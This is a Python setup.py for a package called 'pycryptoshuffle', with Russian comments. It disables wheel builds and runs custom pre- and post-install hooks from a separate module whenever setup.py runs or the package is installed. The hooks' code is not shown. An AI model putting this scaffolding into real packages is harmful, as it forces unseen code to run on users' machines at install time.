from setuptools import setup, find_packages
from setuptools.command.bdist_wheel import bdist_wheel
from custom_install import CustomInstaller, custom_pre_install, custom_post_install
import sys

# Этот хук все еще выполняется при сборке пакета (т.е. когда ты его создаешь)
custom_pre_install()

# --- НОВЫЙ КЛАСС: Запрещаем создание wheel ---
class NoWheel(bdist_wheel):
    """Кастомная команда, которая предотвращает создание wheel-пакета."""
    def run(self):
        # Выводим предупреждение, чтобы пользователь знал, что происходит
        print("Предупреждение: Wheel-пакеты отключены для этого проекта.", file=sys.stderr)
        # Завершаем выполнение команды, не создавая wheel
        return
# --- КОНЕЦ НОВОГО КЛАССА ---

setup(
    name="pycryptoshuffle",
    version="1.0.3",  # Обязательно меняем версию!
    author="Your Name",
    description="Пример библиотеки с кастомным инсталлером",
    packages=find_packages(),
    py_modules=['custom_install'],
    include_package_data=True,
    install_requires=[],
    python_requires=">=3.6",

    # --- ВАЖНО: Переопределяем команду bdist_wheel ---
    cmdclass={
        'bdist_wheel': NoWheel,      # <-- Запрещаем wheel
        'install': CustomInstaller,  # <-- Твой инсталлер
    },

    entry_points={
        'console_scripts': [
            'pycryptoshuffle=pycryptoshuffle.main:main',
        ],
    },

    classifiers=[
        "Programming Language :: Python :: 3",
        "Operating System :: OS Independent",
    ],
)

custom_post_install()